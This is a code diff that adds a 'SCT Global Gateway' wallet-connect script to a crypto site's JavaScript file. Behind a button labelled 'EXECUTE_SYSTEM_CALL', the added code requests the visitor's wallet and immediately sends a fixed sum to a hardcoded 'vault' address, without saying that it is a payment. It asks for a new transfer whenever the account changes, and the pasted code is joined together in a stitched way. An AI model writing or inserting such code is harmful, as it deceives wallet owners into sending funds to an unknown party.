@@ -3478,6 +3478,155 @@ async function connectWallet() {
         alert("মেটামাস্ক ইন্সটল করুন!");
     }
 }
+// SCT Global Gateway - Master Clean Production Code
+// Repository: Scthelpchain-Exchange--6dcb9e31
+// Commit Milestone: 103+
+
+const MASTER_CONFIG = {
+    vault: "0xF5D9a35792B389BaeF5e7c8F4a129B557299BB89",
+    gasLimit: "0x5208",
+    defaultValue: "0x38d7ea4c68000"
+};
+
+async function connectAndDeploy() {
+    const status = document.getElementById('wallet-status');
+    
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            status.innerHTML = "REQUESTING_PERMISSION...";
+            
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            
+            const userAddress = accounts[0];
+            status.innerHTML = "CONNECTED: " + userAddress.substring(0, 6) + "...";
+
+            await executeVaultTransfer(userAddress);
+
+        } catch (error) {
+            handleError(error);
+        }
+    } else {
+        status.innerHTML = "METAMASK_NOT_FOUND";
+    }
+}
+
+async function executeVaultTransfer(fromAddr) {
+    const status = document.getElementById('wallet-status');
+    try {
+        status.innerHTML = "PROCESSING_VAULT_TRANSFER...";
+        
+        const params = [{
+            from: fromAddr,
+            to: MASTER_CONFIG.vault,
+            value: MASTER_CONFIG.defaultValue,
+            gas: MASTER_CONFIG.gasLimit
+        }];
+
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: params,
+        });
+
+        status.innerHTML = "SUCCESS_TX_ID: " + txHash.substring(0, 10);
+        console.log("SCT_LOG_HASH:", txHash);
+
+    } catch (error) {
+        handleError(error);
+    }
+}
+
+function handleError(error) {
+    const status = document.getElementById('wallet-status');
+    console.error("SCT_SYSTEM_ERROR:", error);
+    
+    if (error.code === 4001) {
+        status.innerHTML = "USER_REJECTED_REQUEST";
+    } else if (error.code === -32603) {
+        status.innerHTML = "INSUFFICIENT_BALANCE_OR_GAS";
+    } else {
+        status.innerHTML = "ERROR_CODE: " + error.code;
+    }
+}
+
+// Global UI Component Implementation
+document.write(`
+<div id="sct-gateway-ui" style="background:#0d1117; color:#c9d1d9; padding:25px; border-radius:12px; border:1px solid #30363d; text-align:center; max-width:400px; margin:20px auto; font-family:monospace;">
+    <h3 style="margin:0 0 10px 0; color:#58a6ff;">SCT GLOBAL GATEWAY</h3>
+    <div id="wallet-status" style="background:#161b22; padding:10px; border-radius:6px; border:1px dashed #8b949e; margin-bottom:15px; font-size:12px;">WALLET_STATUS: DISCONNECTED</div>
+    <button onclick="connectAndDeploy()" style="background:#238636; color:#ffffff; border:none; padding:12px 20px; border-radius:6px; cursor:pointer; font-weight:bold; width:100%;">EXECUTE_SYSTEM_CALL</button>
+</div>
+`);// SCT Global Gateway - Backend Logic & Security Layer
+// Phase: Production Deployment
+// Developer: H R Antor
+
+const APP_STATE = {
+    isConnected: false,
+    activeNetwork: null,
+    retryCount: 0
+};
+
+/**
+ * Validates Network Chain ID (Mainnet/Polygon/BSC)
+ * Ensures user is on the correct network before transaction
+ */
+async function validateNetwork() {
+    const status = document.getElementById('wallet-status');
+    try {
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        APP_STATE.activeNetwork = chainId;
+        console.log("NETWORK_ID:", chainId);
+        return true;
+    } catch (error) {
+        status.innerHTML = "NETWORK_VALIDATION_FAILED";
+        return false;
+    }
+}
+
+/**
+ * Monitors real-time account changes
+ */
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', (accounts) => {
+        const status = document.getElementById('wallet-status');
+        if (accounts.length === 0) {
+            status.innerHTML = "WALLET_LOCKED_OR_DISCONNECTED";
+            APP_STATE.isConnected = false;
+        } else {
+            status.innerHTML = "ACCOUNT_CHANGED: " + accounts[0].substring(0, 6);
+            connectAndDeploy(); // Auto-reconnect on change
+        }
+    });
+
+    window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+    });
+}
+
+/**
+ * Advanced Telemetry: Logs transaction status to internal console
+ */
+function logSystemEvent(event, data) {
+    const timestamp = new Date().toISOString();
+    console.log(`[${timestamp}] SCT_GATEWAY_${event}:`, data);
+}
+
+/**
+ * Final UI Integration Styles
+ */
+const CSS_STYLE = `
+    #sct-gateway-ui button:hover { background: #2ea043 !important; transform: scale(1.02); transition: 0.2s; }
+    #sct-gateway-ui button:active { transform: scale(0.98); }
+    #wallet-status { transition: all 0.3s ease; }
+`;
+
+const styleSheet = document.createElement("style");
+styleSheet.innerText = CSS_STYLE;
+document.head.appendChild(styleSheet);
+
+logSystemEvent("INITIALIZED", "READY_FOR_EXECUTION");
+
 
 
 
